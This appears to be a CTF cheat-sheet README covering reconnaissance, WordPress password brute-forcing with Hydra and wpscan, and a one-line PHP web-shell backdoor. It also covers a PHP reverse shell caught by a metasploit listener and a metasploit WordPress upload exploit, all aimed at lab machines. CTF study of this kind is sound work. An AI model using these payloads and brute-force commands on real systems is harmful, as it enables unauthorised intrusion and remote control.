# CTF  -- [CTF AWESOME](https://github.com/apsdehal/awesome-ctf)
Steps to follow when participating to CTF

## See all opened ports, [here](https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/)

```bash
# All ports
nmap -p- 192.168.1.1
# This may detect more things, takes longer: Detects if ftp is vulnerable
nmap -A 192.168.1.1

nmap -sV -A 192.168.1.1
 
```

### Connect to a specific port
```bash
nc -n 192.168.0.157 13337

```

## More info about the website:
```bash
whatweb http://192.168.0.157:80

Output:
http://192.168.0.157:80 [200 OK] Apache[2.4.27], Country[RESERVED][ZZ], HTML5, HTTPServer[Fedora Linux][Apache/2.4.27 (Fedora)], IP[192.168.0.157], Title[Morty's Website]

```

## Dirbuster

```bash
dirbuster

wordlist: /usr/share/dirbuster/wordlists
```

### Scan website with nikto

```bash
nikto -h host [-port p]
```

### Scan wordpress site:

```bash
wpscan --url host --enumerate vp

# --enumerate vp: vulnerable plugins

wpscan --url 192.168.56.223/bull/ -r --enumerate u --enumerate vp --enumerate t --enumerate tt

# --enumerate u e= enumerate users

```


## Files in images [here](http://ctfs.github.io/resources/topics/steganography/file-in-image/README.html):

```bash
The terminating byte for a JPEG is FF D9 in hex

PK are the initials of Phil Katz, the inventor of the zip file
```

### Image on image [here](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install)

```bash
#!/bin/bash -ex

wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
mkdir bin
mv stegsolve.jar bin/
```

### Find strings in image:
```bash
strings image.jpg
```

## Brute force passwords with HYDRA or wpscan

```bash
hydra -l elliot -P ~/fsocity.dic 10.0.2.4 http-post-form “/wp-login.php:log=elliot&pwd=^PASS^:ERROR”

Where:
    -l specifies the username
    -P specifies the dictionary file
    http-post-form is the authentication method being used

and,

“/wp-login.php:log=elliot&pwd=^PASS^:ERROR”

roughly parses to,

    /wp-login.php the login page to attack
    log=elliot is the username on the form
    pwd=^PASS^ substitutes the passwords from the dictionary file
    ERROR tells it what to look for if it fails
```

### WPscan
```bash
wpscan -u 10.0.2.4 --wordlist ~/fsocity.dic --username elliot
```

### Generate wordlist based on the content from a website

```bash
 cewl [ -m 6 ]-w passwords.txt http://derpnstink.local/weblog/
 
 # [ -m 6 ] Minimum size 6
 
 # You can pass the through john's rules, here's a tutorial: http://netsec.ws/?p=457
 john --wordlist=passwords.txt --rules --stdout > words-john.txt
```


## Root escalation
```bash
sudo -

sudo -i
```

## PHP

#### Shell one-line

https://gist.github.com/sente/4dbb2b7bdda2647ba80b

```php
<!-- Simple PHP Backdoor By DK (One-Liner Version) -->
<!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

### Using reverse shell with metasploit

Kali has some reverse shells for php: `/usr/share/webshells/php`, ex: `php-reverse-shell.php`

Change in that script the following lines:

```php
$ip = '192.168.1.159';  // CHANGE THIS your IP, not VM ip
$port = 55555;       // CHANGE THIS your PORT(where the metasploit will listen)
```

Upload file to VM.

Open metasploit:

```bash
msfconsole

msf > use multi/handler
msf exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
# Output: payload => linux/x86/shell/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.1.159
# Output: LHOST => 192.168.1.159
msf exploit(multi/handler) > set LPORT 55555
# Output: LPORT => 55555
msf exploit(multi/handler) > exploit
#
$ whoami
```

Open the page containing the shell and start writing in the msfconsole linux commands: `whoami`.

## Wordpress

### Plugin SlideShow < 1.4.7

Exploit WordPress using SlideShow Gallery Authenticated File Upload

```bash

mfsconsole

use exploit/unix/webapp/wp_slideshowgallery_upload
set RHOST 192.168.1.74
set TARGETURI /weblog/
set WP_USER admin
set WP_PASSWORD admin
run

shell
```


## WalkThroughs

 - [MrRobot](https://securitybytes.io/vulnhub-com-mr-robot-1-ctf-walkthrough-7d4800fc605a)
 - [Seatle Ctf](https://medium.com/@DRX_Sicher/seattle-ctf-walkthrough-a2fb2bf9367c)
 - [Rickdiculouslyeasy](https://portunreachable.com/ctf-walkthrough-vulnhub-rickdiculouslyeasy-26da0981413a)
